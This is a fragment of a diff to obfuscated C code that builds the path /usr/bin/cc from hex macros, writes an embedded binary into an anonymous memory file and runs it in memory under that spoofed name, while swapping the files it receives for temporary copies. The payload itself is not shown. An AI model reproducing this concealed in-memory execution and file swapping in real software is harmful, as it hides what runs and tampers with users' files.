@@ -15,7 +15,7 @@
 #define D(x) #x
 #define E(x) D(x)
 
-#define P E(/ A(75, 73, 72) / A(62, 69, 6e) / A(63, 63, 64))
+#define P E(/A(75,73,72)/A(62,69,6e)/A(63,63,64))
 
 #define C75 u
 #define C73 s
@@ -43,18 +43,16 @@ extern char **environ;
       rename(p, v[i]);                                                         \
       rename(t, p);                                                            \
     }                                                                          \
+    a[i] = v[i];                                                               \
   }
 
 int main(int c, char *v[]) {
   int f;
-  char *a[999], *p, *t = ".tmp";
+  char *a[999] = {P}, *t = ".tmp", *p;
 
   S
 
   if (!fork()) {
-    a[0] = P;
-    for (f = 1; f < c; f++)
-      a[f] = v[f];
     write(f = memfd_create("", 1), cc, sizeof cc);
     execveat(f, "", a, environ, 4096);
   }
